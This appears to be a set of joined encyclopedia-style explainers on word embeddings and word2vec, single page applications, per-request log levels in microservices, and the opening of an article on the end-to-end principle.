To see this in practice , consider the following vector equations : $ $ king\,–\,man\,+\,woman = queen\\Paris\,–\,France\,+\,Germany = Berlin$$ The relationship between ' king ' and ' man ' is the same as that between ' queen ' and ' woman ' .
This is captured in the vector space .
This means that , given the word vectors for Paris , France and Germany , we can find the capital of France .
The term word analogy is often used to refer to this phenomenon .
What are some applications for word embeddings ?
Word embeddings have become useful in many downstream NLP tasks .
Word embedding along with neural networks have been applied successfully for text classification , thereby improving customer service , spam detection , and document classification .
Machine translations have improved .
Analyzing survey responses or verbatim comments from customers are specific examples .
Word embeddings help in adapting a model from one domain to another , such as from legal documents to news articles .
In general , this is called domain adaptation . It 's useful for machine translation and transfer learning .
In addition , pretrained word vectors can be adapted to domains where large training datasets are not available .
In recommendation systems , such as suggesting a playlist of songs , word embeddings can figure out what songs go well together in a particular context .
In search and information retrieval applications , word embedding has been shown to be insensitive to spelling errors and exact keyword matches are not required .
Even for words not seen during training , machine learning models work well provided such words are in the vector space .
Thus , word embedding is being preferred over older approaches such as TF - IDF or bag - of - words .
What traits do we expect from a good word embedding ?
Different models give different word embeddings .
A good representation should aim for the following : Non - conflation : A word can occur in different contexts , giving rise to variants ( tense , plural , etc .
) .
Embedding should represent these differences and not conflate them .
Unambiguous : All meanings of the word should be represented .
For example , for the word ' bow ' , the difference between " the bow of a ship " and " bow and arrows " should be represented .
Multifaced : Words have multiple facets : phonetic , morphological , syntactic , etc .
Representation should change when tense changes or a prefix is added .
Reliable : During training , word vectors are randomly initialized .
This will lead to different word embeddings from the same dataset .
In any case , the final output should be reliable and show consistent performance .
Good Geometry : There should be a good spread of words in the vector space .
In general , rare words should cluster around frequent words .
Frequent unrelated words should be spread out .
Which are the well - known word embeddings ?
One of the first word embeddings is the Neural Network Language Model ( NNLM ) in which word embeddings are learnt jointly with the language model .
Embeddings can also be learnt using Latent Semantic Analysis ( LSA ) or Latent Dirichlet Allocation ( LDA ) .
NNLM has high complexity due to non - linear hidden layers .
A tradeoff is to first learn the word vectors using a neural network with a single hidden layer , which is then used to train the NNLM .
Other log - linear models are Continuous Bag - of - Words ( CBOW ) and Continuous Skip - gram .
An improved version of the latter is Skip - gram with Negative Sampling ( SGNS ) .
These are part of the word2vec implementation .
CBOW and Skip - gram models use only local information .
Global Vectors ( GloVe ) is an approach that considers global statistical information as well .
Word - to - word co - occurrence counts are used .
GloVe combines LSA and word2vec .
Rare words can be poorly estimated .
FastText overcomes this by using subword information .
Other models include ngram2vec and dict2vec .
Embeddings from Language Models ( ELMo ) is a representation that captures sentence level information .
Based on ELMo , BERT and OpenAI GPT are two pretrained models for other NLP tasks that have been proven effective .
What 's the role of the embedding layer and the softmax layer ?
The general architecture of word embeddings using neural networks involves the following : Embedding Layer : Generates word embeddings from an index vector and a word embedding matrix .
Hidden Layers : These produce intermediate representations of the input .
LSTMs could be used here .
In word2vec , there are no hidden layers .
Softmax Layer : The final layer that gives the distribution over all words in the vocabulary .
This is the most computationally expensive layer and much work has gone into simplifying it .
Two broad categories are softmax - based approaches and sampling - based approaches .
What 's the process for generating word embeddings ?
We can use a neural network on a supervised task to learn word embeddings .
The embeddings are weights that are tuned to minimize the loss on the task .
For example , given 50 K words from a collection of movie reviews , we might obtain a 100-dimensional embedding to predict sentiment .
Words signifying positive sentiment will be closer in the vector space .
Since embeddings are tuned for a task , selecting the right task is important .
Word embedding can be learnt from a standalone model and then applied to different tasks .
Or it could be learnt jointly with a task - specific model .
For good embeddings , we would need to train on millions or even billions of words .
An easier approach is to use pretrained word embeddings ( word2vec or GloVe ) .
They can be used " as is " if they suit the task at hand .
If not , they can be updated while training your own model .
In biomedical NLP , it was noted that bigger corpora do n't necessarily result in better embeddings .
Sometimes intrinsic and extrinsic evaluation methods do n't agree well .
Hyperparameters that we can tune include negative sampling size , context window size , and vector dimension .
Gains plateau at about 200 dimensions .
Could you share some practical tips for applying word embedding ?
Predictive neural network models ( word2vec ) and count - based distributional semantic models ( GloVe ) are different means to achieve the same goal .
There 's no qualitative difference .
Word2vec has proven to be robust across a range of semantic tasks .
For syntactic tasks such as named entity recognition or POS tagging , a small dimensionality is adequate .
For semantic tasks , higher dimensionality may prove more effective .
It 's also been noted that pretrained embeddings gives better results .
It 's been commented that 8 dimensions might suffice for small datasets and as many as 1024 dimensions for large datasets .
In 2018 , selecting the optimal dimensionality was still considered an open problem .
There are too few dimensions , embeddings are not expressive .
Too many dimensions , embeddings are overfitted and the model becomes complex .
Commonly , 300 dimensions are used .
What are some challenges with word embedding ?
Models such as ELMo and BERT , capture the surrounding context within word embeddings .
However , word embeddings do n't capture " context of situation " the way linguist J.R. Firth defined it in the 1960s .
To achieve true NLU , we would have to combine the statistical approach of word embeddings along with the older linguistic approach .
More generally , it 's been said deep learning is n't sample efficient .
Perhaps we need something better than deep learning to tackle language with compositional properties .
Word embeddings do n't capture phrases and sentences .
For example , it would be misleading to combine the words vectors to represent " Boston Globe " .
Embeddings for " good " and " bad " might be similar , causing problems for sentiment analysis .
Word embeddings do n't capture some linguistic traits .
For example , vectors for ' house ' and ' home ' may be similar but vectors for ' like ' and ' love ' are not .
In general , when a word has multiple meanings , called homographs or polysemys , its vector is an average value .
One solution is to consider both the word and its part of speech .
Inflections also cause problems .
For example , ' find ' and ' locate ' are close to each other but not ' found ' and ' located ' .
Lemmatization can help before training the word vectors .
What software tools are available for word embedding ?
Both word2vec and GloVe implementations are available online .
In some frameworks , such as Spark MLlib or DL4J , word2vec is readily available .
Some frameworks that support word embedding are S - Space and SemanticVectors ( Java ) ; Gensim , PyDSM and DISSECT ( Python ) .
Deeplearning4j provides the ` SequenceVectors ` class , an abstraction above word vectors .
This allows us to extract features from any data that can be described as a sequence , be it transactions , proteins or social media profiles .
A tutorial explaining word embeddings in TensorFlow is available .
You can also download pretrained word embeddings .
Note that many use lemmatization while learning word embeddings .
In contrast to the formal linguistics of Noam Chomsky , researchers in the 1950s explored the idea that context could be useful for linguistic representation .
This is based on structuralist linguistics .
The Distributional Hypothesis by Zellig Harris states that word meanings are associated with context .
Another linguist , John Firth , states , You shall know a word by the company it keeps !
Early attempts were made in the 1960s to construct features to represent semantic similarities .
Hand - crafted features are used .
Charles Osgood 's semantic differentials is an example .
Deerwester et al .
note that words and documents in which they occur have a semantic structure .
They exploit this structure for information retrieval to match documents based on concepts rather than keywords .
They map words to documents as a matrix with word counts , giving a sparse representation .
They attempt at the most 100 dimensions and employ the technique of Singular Value Decomposition ( SVD ) .
They coin the term Latent Semantic Indexing ( LSI ) .
Neural network with word vector C(i ) for ith word .
Source : Bengio et al .
2003 , fig .
1 .
Bengio et al .
propose a language model based on neural networks , though they 're not the first ones to do so .
They use a feed - forward NN with one hidden layer .
Words are represented as feature vectors .
The model learns vectors and joint probability function of word sequences .
However , they do n't use the term " word embeddings " .
Instead , they use the term distributed representation of words .
Note that here we 're interested in similar words whereas LSI is about similar documents due to its application to information retrieval .
Words to features to word vectors via lookup tables .
Source : Collobert and Weston 2008 , fig .
1 .
Collobert and Weston show the usefulness of pretrained word embeddings .
Using such word embeddings , they show that a number of downstream NLP tasks can be learned by a neural network .
They consider both syntactic tasks ( POS tagging , chunking , parsing ) and semantic tasks ( named entity recognition , semantic role labelling , word sense disambiguation ) .
In their approach , a word is decomposed into features and then converted to vectors using lookup tables .
At Google , Mikolov et al .
develop word2vec that helps in learning standalone words embeddings from a text corpus .
Efficiency comes from removing the hidden layer and approximating the objective .
Word2vec enabled large - scale training .
Embeddings from the skip - gram model are shown to give state - of - the - art results for sentence completion , analogy and sentiment analysis .
Stanford researchers released GloVe word embedding .
This has vectors of 25 - 300 dimensions learned from up to 840 billion tokens .
Aligning word embeddings of English and Italian to enable language translation .
Source : Conneau et al .
2018 , fig .
1 .
Conneau et al .
apply word embedding to language translation by aligning monolingual word embedding spaces in an unsupervised way .
They do n't require parallel corpora or character - level information .
This can therefore benefit low - resource languages .
They achieve better results as compared to supervised methods .
Earlier in 2016 , Sebastian Ruder published a useful survey of many cross - lingual word embeddings .
An overview of word2vec .
Source : Udacity 2016 , 0:25 .
Word2vec is a set of algorithms to produce word embeddings , which are nothing more than vector representations of words .
The idea of word2vec , and word embeddings in general , is to use the context of surrounding words and identify semantically similar words since they 're likely to be in the same neighbourhood in vector space .
Word2vec algorithms are based on shallow neural networks .
Such a neural network might be optimized for a well - defined task , but the real goal is to produce word embeddings that can be used in NLP tasks .
Word2vec was invented by Google in 2013 .
Word2vec simplified computation compared to previous word embedding models .
Since then , it has been popularly adopted by others for many NLP tasks .
Airbnb , Alibaba and Spotify have used it to power recommendation engines .
What 's the key insight that led to the invention of the word2vec ?
Before word2vec , a feedforward neural network was used to jointly learn the language model and word embeddings .
This network had input , projection , hidden and output layers .
The complexity is dominated by the mapping from projection to hidden layers .
For N ( = 10 ) previous words , D - dimensional vectors ( 500 - 2000 dimensions ) , and hidden layer size H ( 500 - 1000 ) , complexity is N x D x H. A recurrent neural network model removes the projection layer .
The hidden layer connects to itself with a time delay .
Complexity is now H x H. Word2vec does away with the non - linear hidden layer that was a bottleneck in earlier models .
There 's a tradeoff .
We lose precise representation but training becomes more efficient .
This simpler model is used to learn word vectors .
The task of learning a language model is considered separately using these word vectors .
Finally , not just past words but also future words are considered for context .
When input words are projected , their vectors are averaged at the projection layer , unlike earlier models .
Further simplification of the softmax layer computation , enabled word2vec to be trained on 30 billion words , a scale that was not possible with earlier models .
What are the main models that are part of word2vec ?
Two word2vec models for obtaining word embeddings .
Source : Rong 2016 , fig .
2 and 3 .
Let 's use a vocabulary of V words , a context of C words , a dense representation of N - dimensional word vector , an embedding matrix W of dimensions VxN at the input and a context matrix W ' of dimensions NxV at the output .
Word2vec has two models for deriving word embeddings : Continuous Bag - of - Words ( CBOW ) : We take words surrounding a given word and try to predict the latter .
Each word is a one - hot coded vector .
Via an embedding matrix , this is transformed into a N - dimensional vector that 's the average of C word vectors .
From this vector , we compute probabilities for each word in the vocabulary .
The word with highest probability is the predicted word .
Continuous Skip - gram : We take one word and try to predict words that occur around it .
In the output , we try to predict C different words .
Could you describe the details of how word2vec learns word embeddings ?
Use of sliding window in word2vec skip - gram model .
Source : Alammar 2019 .
Word2vec uses a neural network model based on word - context pairs .
With each training step , the weights are adjusted with the goal of minimizing the loss function , that is , minimizing the error between predicted output and actual output .
An iteration uses one word - context pair .
Training on the entire input corpus may be considered one training epoch .
Consider the skip - gram model .
A sliding window around the current input word is used to predict the words within the window .
Once this iteration adjusts the weights , the window slides to the next word in the corpus .
Word2vec is not a deep learning technique .
In fact , there are no hidden layers , although it 's common to refer to the embedding layer as the hidden layer , or projection layer .
A typical pipeline involves selecting the vocabulary from a text corpus , sliding the window to select context , performing extra tasks to simplify softmax computation , and iterating through the neural network model .
Why is the softmax layer of word2vec considered computationally difficult ?
Word2vec uses a softmax layer .
Source : Parellada 2017 .
The softmax layer treats the problem of selecting the most probable word as a multiclass classification problem .
It computes the probability of each word being the actual word .
The probabilities of all words should add up to 1 .
For the skip - gram model , it does this for each contextual word .
Consider a vocabulary of K words , and the input and output vectors \(v_w\ ) and \(v'_w\ ) of word w. For skip - gram , softmax function is the probability of an output word given the input word , $ $ p(w_O|w_I ) = \frac{e^{{v'_{w_O}}^T\,v_{w_I}}}{\sum_{w=1}^{K } e^{{v'_w}^T\,v_{w_I}}}$$ With a vocabulary of hundreds of thousands of words , computing the softmax probability for each word for each iteration is computationally expensive .
Hierarchical Softmax solves this problem by making computations on word parts and reusing the results .
Negative Sampling is an alternative .
It selects a few negative samples and computes softmax only for these and the actual outputs .
Both these simplify computation without much loss of accuracy .
Sebastian Ruder gives a detailed explanation of different softmax approximation techniques .
What are other improvements to word2vec ?
The Word2vec implementation has the ability to select a dynamic window size , uniformly sampled in range [ 1 , k ] .
This has the effect of giving more weight to closer words .
Smaller window sizes lead to similar interchangeable words .
Larger window sizes lead to similar related words .
Word2vec can also ignore rare words .
In fact , rare words are discarded before the context is set .
This increases the effective window size for some words .
In addition , we can subsample frequent words with the insight that being frequent , they are less informative .
The net effect of this is that words that are far away can be topically similar and therefore captured in the embeddings .
What are some tips for those trying to use the word2vec ?
Developers can read sample TensorFlow code for the CBOW model , sample NumPy code , or sample Gensim code .
Designed by Xin Rong , wevi is a useful tool to visualize how word2vec learns word embeddings .
Sebastian Ruder gives a number of tips .
Use Skip - Gram Negative Sampling ( SGNS ) as a baseline .
Use many negative samples for better results .
Use context distribution smoothing before selecting negative samples so that frequent words are not sampled quite so frequently .
SGNS is a better technique than CBOW .
Example : binary tree for hierarchical softmax .
Source : Rong 2016 , fig .
4 .
Morin and Bengio came up with the idea of hierarchical softmax .
A word is modelled as a composition of inner units , which are then arranged as a binary tree .
Given a vocabulary of V words , the probability of an output word is computed from softmax computation of inner units that lead to the word from the root of the tree .
This reduces complexity from O(V ) to O(log(V ) ) .
This idea becomes important later in word2vec models .
In 2009 , Mnih and Hinton explored different ways to construct the tree .
Gutmann and Hyvarinen introduce Noise Contrastive Estimation ( NCE ) as an alternative to hierarchical softmax .
The basic idea is that a good model can differentiate data from noise using logistic regression .
Mnih and Teh apply NCE to language modelling .
This is similar to hinge loss proposed by Collobert and Weston in 2008 to rank data above noise .
At Google , Mikolov et al .
develop word2vec although this name refers to a software implementation rather than the models .
They propose two models : continuous bag - of - words and continuous skip - gram .
They improve on earlier state - of - the - art models by removing the hidden layers .
They also make use of hierarchical softmax , thus making this a log - linear model .
Softmax uses Huffman binary tree to represent the vocabulary .
They note that this speeds up evaluation by 2X. Mikolov et al .
improve on their earlier models by proposing negative sampling , which is a simplification of NCE .
This is possible because NCE tries to maximize the log probability of the softmax whereas we are more interested in the word embeddings .
Negative sampling is simpler and faster than hierarchical softmax .
For small datasets , 5 - 20 negative samples may be required .
For large datasets , 2 - 5 negative samples may be enough .
Inspired by word2vec , some researchers produce code embeddings , vector representations of snippets of software code .
Called code2vec , this work could enable us to apply neural networks to programming tasks such as automated code reviews and API discovery .
This is just one example of many advances due to word2vec .
Another example is doc2vec from 2014 .
Scaling word2vec using multiple GPUs .
Source : Li et al .
2019 , fig .
9 .
Word2vec is sequential due to strong dependencies across word - context pairs .
Researchers show how word2vec can be trained on a GPU cluster by reducing dependency within a large training batch .
Without loss of accuracy , they achieve 7.5 times acceleration using 16 GPUs .
They also note that using the Chainer framework , it 's easy to implement CNN - based subword - level models .
A web application broadly consists of two things : data ( content ) and control ( structure , styling , behaviour ) .
In traditional applications , these are spread across multiple pages of HTML , CSS and JS files .
Each page is served in HTML with links to suitable CSS / JS files .
A Single Page Application ( SPA ) brings a new programming paradigm to the web .
With SPA , we have a single HTML page for the entire application .
This page , along with the necessary CSS and JS for the site , are loaded when the page is first requested .
Subsequently , as the user navigates the app , only relevant data is requested from the server .
Other files are already available with the client .
The page does n't reload but the view and HTML DOM are updated .
SPA ( along with PWA ) is the modern way to build web applications .
SPA enhances the user experience .
There are frameworks that simplify building SPAs .
Could you explain the single page application for a beginner ?
Page components are updated without reloading the entire page .
Source : Kirupa 2017 .
In a typical multi - page application , each page is generated as HTML on the server and served to the client browser .
Each page has its own URL that 's used by the client to request that page .
When a user navigates from one page to another , the entire page loads .
However , it 's common for all pages to share many UI components : sidebar , header , footer , navigation menu , login / logout UI , and more .
It 's therefore wasteful to download these common elements with every page request .
In terms of user experience , moving from one page to another might be annoying .
The current page might lose UI interaction as the user waits for another page to load .
In SPA , there 's a single URL .
When a link is clicked , relevant content is downloaded and specific UI components are updated to render that content .
The user experience improves because the user stays with and can interact with the current page while the new content is fetched from the server .
When an update happens , there 's no transition to another page .
Parts of the current page are updated with new content .
How does the lifecycle of an SPA request / response compare against a traditional multi - page app ?
SPA request / response is different from multi - page apps .
Source : Sagar 2020 .
In multi - page apps , each request is for a specific page or document .
A server looks at the URL and serves the corresponding page or document .
The entire app is really a collection of pages .
In SPA , the first client request loads the app and all its relevant assets .
These could be HTML plus JS / CSS files .
If the app is complex , this initial bundle of files could be large .
Therefore , the first view of the app can take some time to appear .
During this phase , a loader image may be shown to the user .
Subsequently , when the user navigates within the SPA , an API is called to fetch new data .
The server responds with only the data , typically in JSON format .
The browser receives this data and updates the app view .
The user sees this new information without a page reload .
The app stays on the same page .
Only the view was changed by updating some components of the page .
SPAs are well - suited when we wish to build a rich interactive UI with lots of client - side behaviour .
Which are the different SPA architectures ?
Different SPA architectures .
Source : Gimon 2019 .
Application content might be stored in files or databases .
It can be dynamic ( news sites ) or contextual ( user specific ) .
Therefore , the application has to transform this content into HTML so that users can read them in a web browser .
This transformation process is called rendering .
From this perspective , we note the following SPA architectures : Client - Side Rendering : When the browser requests the site , the server responds quickly with a basic HTML page .
This is linked to CSS / JS files .
While these files are loading , the user sees a loader image .
Once data loads , JavaScript on the browser executes to complete the view and DOM .
Slow client devices can spoil users ' experience .
Server - Side Rendering : HTML page is generated on the fly on the server .
Users can therefore see the content quickly without any loader image .
In the browser , once events are attached to the DOM , the app is ready for user interaction .
Static Site Generators : HTML pages are pre - generated and stored on the server .
This means that the server can respond immediately .
Better still , the page can be served by a CDN .
This is the fastest approach .
This approach is not suitable for dynamic content .
What are the benefits of an SPA ?
With SPA , applications load faster and use less bandwidth .
User experience is seamless , similar to a native app .
Users do n't have to watch slow page reloads .
Developers can build feature - rich applications such as content - editing apps .
On mobile devices , the experience is richer : clicks can be replaced with scrolling and amazing transitions .
With browsers providing many developer tools , SPAs are also easy to debug on the client side .
SPA optimizes bandwidth usage .
The main resources ( HTML / CSS / JS ) are downloaded only once and reused .
Subsequently , only data is downloaded .
In addition , SPAs can cache data , thereby saving bandwidth .
Caching also enables users to work offline.$MERGE_SPACE
What are some criticisms or disadvantages of an SPA ?
Among the disadvantages of SPA is SEO .
SPA has a single URL and all routing happens via JavaScript .
More recently , Google is able to crawl and index JS files .
In general , use multi - page apps if SEO is important .
Adopt SPA for SaaS platforms , social networks or closed communities where SEO does n't matter .
SPA breaks browser navigation .
The browser 's back button will go to the previous page rather than the previous app view .
This can be overcome with the HTML5 History API .
SPA could lead to security issues .
Cross - site scripting attacks are possible .
If developers are not careful , sensitive data could be part of the initial data download .
Since all this data is not necessarily displayed on the UI , it can give developers a false sense of security .
Developers could also unknowingly provide access to privileged functionality on the client side .
SPA needs client - side processing and therefore may not work well on old browsers or slow devices .
It wo n't work if users turn off JavaScript in their browsers .
SPAs can be hard to maintain due to reliance on many third - party libraries .
It 's worth reading Adam Silver 's article on the many disadvantages of SPAs .
What are some best practices when converting a traditional app to an SPA ?
The S3 bucket serves static files while an API server serves data .
Source : Gambling 2017 .
An SPA has to implement many things that come by default in traditional apps : browsing history , routing , deep linking to particular views .
Therefore , select a framework that facilitates this .
Select a framework with a good ecosystem and a modular structure .
It must be flexible and performant for even complex UI designs .
After the initial page loads , subsequent data is loaded by making API calls .
Building an SPA implies a well - defined API .
Involve both frontend and backend engineers while creating this API .
In one approach , serve static files separately from the data that 's handled by API endpoints .
Define clearly which parts of the UI are dynamic .
This helps to organize project modules .
Structure the project to enable reusable components .
Due to its high reliance on JavaScript , they invested in building tools for better dependency management .
Webpack is a good choice .
A build process can do code compilation ( via Babel ) , file bundling and minification .
When converting to an SPA , do n't take an all - out approach .
Migrate incrementally , perhaps one page at a time .
How do I test and measure the performance of an SPA ?
Webpack Bundle Analyzer to analyze bundle sizes .
Source : Crush 2019 .
Testing tools Selenium , Cypress and Puppeteer can also be used to measure app performance .
WebPageTest is an online tool that 's easier to use .
Compared to multi - page apps , there 's more effort to fill in forms or navigate across views .
Application performance on the client side can be monitored via the Navigation Timing API and the Resource Timing API .
But these fail to capture JavaScript execution times .
To address this , the User Timing API can be used .
LinkedIn took this approach and improved the performance of their SPA by 20 % .
Among the techniques they used are lazy rendering ( defer rendering outside viewport ) and lazy data fetching .
At Holiday Extras , their app took 23 seconds to load on a good 3 G connection .
To reduce this , they adopted code splitting to defer loading of non - critical libraries .
CSS was also split into three parts loaded at different stages : critical , body , onload .
They moved from JS rendering to HTML rendering , and then started serving static HTML from Cloudfront CDN .
They did real user monitoring ( RUM ) .
Among the tools they used were React , EJS , Webpack , and Speed Curve .
Could you mention some popular websites or web apps that are SPAs ?
Facebook , Google Maps , Gmail , Twitter , Google Drive , and GitHub are some examples of websites built as SPAs .
For example , in Gmail we can read mails , delete mails , compose and send mails without leaving the page .
It 's the same with Google Maps in which new locations are loaded and displayed in a seamless manner .
Generally , writers get suggestions and corrections as they compose their content .
All this is powered by HTML5 and AJAX to build responsive apps .
Trello is another example of SPA .
The card layout , overlays , and user interactions are all done without any page reloads .
What are some tools and frameworks to help me create an SPA ?
The three main frameworks for building SPAs are React , Angular and Vue on the client side , and Node.js on the server side .
All these are based on JavaScript .
Other JavaScript frameworks include Meteor , Backbone , Ember , Polymer , Knockout and Aurelia .
Developers can choose the right framework by comparing how each implements or supports the UI , routing , components , data binding , usability , scalability , performance , and testability .
For example , while Ember comes with routing , React does n't ; but many modules for React support routing .
React supports reusable components .
React supports one - way data binding whereas Angular supports two - way data binding .
Ember and Meteor are opinionated whereas React and Angular are less so and more flexible .
.NET / C # developers can consider using Blazor .
The Blazor can work both on the client side and the server side .
It runs on a web browser due to WebAssembly .
Design tools support traditional multi - page sites .
Adobe Experience Manager Sites is a tool that allows designers to create or edit SPAs .
It supports drag - and - drop editing , out - of - the - box components and responsive web design .
How does an SPA differ from a PWA ?
SPA compared with PWA .
Source : Adapted from Vu 2019 .
PWA uses standard web technologies to deliver a mobile native app - like experience .
They were meant to make responsive web apps feel more native on mobile platforms .
PWA enables the app to work offline , push notifications and access device hardware .
Unlike SPA , PWA uses service workers , web app manifest and HTTPS .
PWA loads almost instantly since service workers run in a separate thread from the UI .
SPAs need to pre - fetch assets at the start and , therefore , there 's always an initial loading screen .
SPAs can also use service workers , but PWAs do it better .
In terms of accessibility , PWAs are better than SPAs .
SPAs might be suited for data - intensive sites that are not necessarily visually stunning .
But PWA are not so different from SPA .
Both offer an app - like user experience .
Many PWAs are built with the same frameworks that are used to build SPA .
In fact , an app might initially be developed as an SPA .
Later , additional features such as caching , manifest icons and loading screens could be added .
This makes an SPA more like a PWA .
In the mid-1990s , rich interactions on web browsers became possible due to two different technologies : Java Applets and Macromedia Flash .
Browsers are merely proxies for these technologies that have to be explicitly installed as browser plugins .
With these technologies , all content is either loaded upfront or loaded on demand as the view changes .
No page reloads are necessary .
In this sense , these are ancestors of modern SPAs .
Jesse James Garrett publishes a paper titled Ajax : A New Approach to Web Applications .
This describes a novel way to design web applications .
AJAX , that expands to Asynchronous Javascript + XML , makes asynchronous requests in the background while the user continues to interact with the UI in the foreground .
Once the server responds with XML ( or JSON or any other format ) data , the browser updates the view .
AJAX uses the ` XMLHTTPRequest ` API .
While this has been around since the early 2000s , Garrett 's paper popularizes this approach .
With the launch of GitHub , many JavaScript libraries and frameworks have been invented and shared via GitHub .
These become the building blocks on which true SPAs will later be built .
Twitter releases a new version of its app with client - side rendering using JavaScript .
The initial page load becomes slow .
Due to the diversity of client devices and browsers , user experience has become inconsistent .
In 2012 , Twitter updated the app towards server - side rendering and defers all JS execution until the content is rendered on the browser .
They also organize the code as CommonJS modules and do lazy loading .
These changes reduce the initial page load to a fifth .
Google is building an app for its Google I / O event .
Google engineers call this both an SPA and a PWA .
With an App Engine backend,theappusesweb components , Web Animations API , material design , Polymer and Firebase .
During the event , the app brings more user engagement than the native app .
We might say that the app started as a SPA to create a PWA .
In general , it 's better to plan for a PWA from the outset rather than re - engineer an SPA at a later point .
Comparing different types of rendering approaches for SPA .
Source : Miller and Osmani 2019 .
Google engineers compare different SPA architectures in terms of performance .
One of these is called rehydration , which combines both server - side and client - side renderings .
This has the drawback that content loads quickly but is not immediately interactive , thus frustrating the user .
Architecture of a distributed Vue.js server - side rendering SPA .
Source : Section 2019 .
With the rise of edge computing , section describes in a blog post how a Nuxt.js app ( based on Vue.js ) can be deployed at the edge .
The app is housed within a Node.js module deployed at the edge .
This SPA uses server - side rendering .
For applications in production , setting breakpoints is usually not a viable option .
Logging is the preferred approach to solving problems in production .
For runtime efficiency , storage and analysis , we often want to log only the most important messages .
However , when an error occurs , a more detailed log is needed to find the root cause .
But turning on full debug or trace level logging can result in huge logs and slow down analysis .
The idea of log level per request is to increase the level of logging only for that request that 's causing the error .
Executions triggered by other requests will continue to be logged in the default manner .
This approach is particularly useful for microservice architecture , where a single request can involve multiple microservices , all of which can possibly handle hundreds of requests per second .
Why is the log level per request important for microservices ?
A single request may involve many microservices .
Source : Arsov 2017 .
Complex large - scale applications are moving away from monolithic architecture to microservice architecture .
But failures are hard to troubleshoot in microservices .
A single HTTP request can trigger a sequence of calls and responses across many microservices .
This distributed nature of microservices makes it hard to debug problems such as malformed data .
It 's harder to track down performance issues .
In monolithic applications , it 's easy to put breakpoints and follow the sequence of function calls to understand the problem , at least in a development environment .
This is n't possible for microservices , particularly in production .
The log level per request therefore helps us obtain detailed logs pertaining to a particular problem .
In general , logging , monitoring and measuring comes under instrumentation .
For example , a microservice may be called in dozens of user scenarios , only one of which causing an error .
Detailed debug logging can be turned on for this single scenario .
We avoid overwhelming the system with debug level logging for all other high - level user requests .
What should I expect from a good implementation of log level per request ?
To change log level on a per request basis , you should n't be asked to recompile the application .
It should be possible to set the log level easily for different environments : development , production , user acceptance testing , non - functional testing , etc .
Log level should be configurable for each application or component , and independent of event - raising code .
It 's recommended that you log entry and exit of functions .
Log enough to set the context , including name of function , user , or even IP address .
Logs should be complete in the sense that the information should help solve a problem .
Past incident reports can help you decide what , where and how much to log .
In time , you can even develop logging patterns .
Your development pipeline should catch codes where logs are missing .
Deployment may flag functions that are not logging .
In general , for microservice logging , centralize the logging from different hosts .
Log structured data , such as in JSON format .
Log asynchronously .
Make logs searchable , for instance , by using ELK Stack .
What are some possible techniques for implementing log level per request ?
Use of correlation IDs in AWS .
Source : Cui 2017 .
One suggested approach is to use a correlation ID , passed from service to service .
This ID is unique to a particular transaction or a high - level request .
With this ID , we can follow the execution journey of a transaction in the logs .
Moreover , we can set the desired log level for this transaction .
To change log levels without compiling code , we could have a definitive list of all events / requests and a configurable mapping between these and the log levels .
Such a mapping could be in an XML file .
A correlation ID can be used whenever we wish to group together errors due to a request .
Some examples of grouping are scheduled or background tasks ; synchronized operations ; all activities pertaining to a single request .
A correlation ID can be generated by an " edge " microservice that then triggers internal microservices .
In addition , any microservice that does n't see an ID can generate one for subsequent tracing .
In fact , an API Gateway in AWS generates these IDs that are passed along in HTTP headers .
Preferably , the ID is assigned as early as possible .
Is n't the log level per request same as event tracing ?
They are related but not the same .
Event tracing is about tracing an event and its effect across systems and services .
It 's supported by tools such as Sentry .
Not just events or requests , even messages in a queue can carry the trace ID .
However , traditionally , event tracing was not really about dynamically setting the log level on a per request basis .
It was about correlating log entries based on a trace ID .
Could you name some tools that support log level per request ?
Tracing frameworks might support this feature .
Some of them may be based on the OpenTracing standard .
Zipkin , Datadog , and Dynatrace are tools that accept the OpenTracing format .
Logging frameworks are tied to languages : Log4j ( Java ) , NLog ( .NET ) , Node - Loggly ( Node ) , etc .
Select a framework based on code cleanliness , performance and familiarity .
If using Spring Cloud for implementing microservices , use Spring Sleuth along with Zipkin for using correlation IDs .
You can use Spring Boot admin to change log levels dynamically .
In the .NET framework , the namespace ` System .
Diagnostics ` has the property ` CorrelationManager .
ActivityId ` .
This is set per request .
Thus , all errors thrown during one request will have the same ID .
ModSecurity , a web application firewall , supports log level per request and also allows us to change the level at runtime .
Debug and trace levels incur exponentially more processing time .
Source : Pardal 2010 , fig .
16 .
At the University of Lisbon , researchers extended a framework called STEP for monitoring and performance analysis .
STEP is a Java - based enterprise application framework created for educational purposes .
They use Apache Log4j for logging and note that debug and trace levels are impractical for production environments .
They propose activating such logging for a subset of requests , such as requests from a specific user .
Matthew Skelton writes about tuning logging levels in production without recompiling the code .
He notes that often logging APIs suffer from leaky abstraction because the application selects the log level at the point of calling .
Thus , we would need to recompile to effect new logging levels .
Apache log4net allows change of log levels without recompiling , but it ca n't do this for specific event types .
Apache Log4j 2 ( version 2.0 ) has been released .
Using ` ThreadContext ` and ` DynamicThresholdFilter ` , we can control logging level on a per - request basis .
Therefore , we can " debug batch jobs which have a certain flag , WebSocket connections or any other thread - based processing " .
This is in addition to debugging HTTP requests by setting a flag such as ` x - debug - enabled : true ` in the HTTP header .
Correlation ID is passed across multiple services .
Source : Rapid7 2016 .
A Rapid7 blog post notes that the use of correlation IDs is a well - known enterprise integration pattern called Correlation Pattern .
Such an ID is a non - standard HTTP header and it 's part of the Java Messaging Service ( JMS ) .
An example is a travel reservation system .
Once an ID is assigned to a reservation request , the same ID is passed to hotel , car rental and airline systems / services .
Timestamps are not enough in logs and a correlation ID " provides the glue that is needed to create a coherent , understandable audit of events " .
One developer , named Reik , shows how to use Twitter 's Finagle framework to dynamically set per - request log level .
The idea is to use Finagle 's " broadcast context to transport a log level override through an RPC graph " .
HTTP headers are used and Finagle filters can read them .
ThoughtWords includes log level per request in its quarterly Technology Radar .
It notes its relevance towards debugging microservices .
When a function has to be supported in a networked system , the designer often asks if it should be implemented at the end systems ; or should it be implemented within the communication subsystem that interconnects all the end systems .
The end - to - end argument or principle states that it 's proper to implement the function in the end systems .
The communication system itself may provide a partial implementation , but only as a performance enhancement .
The architecture and growth of the Internet was shaped by the end - to - end principle .
It allowed us to keep the Internet simple and add features quickly to end systems .
The principle enabled innovation .
More recently , the principle has been criticized or violated for support features such as network caching , differentiated services , or deep packet inspection .
Could you explain the end - to - end principle ?
E2E principle and the Internet .
Source : Challen 2016 .
Suppose we need to transfer a file from computer A to computer B across a network .
Let 's assume that the network guarantees correct delivery of the file by way of checksums , retransmissions , and deduplication of packets .
Thus , our hypothetical network is full of features but also complex .
The problem is that , despite such a smart network , file transfer can still go wrong .
The file could get corrupted on B during transfer from buffer to the file system .
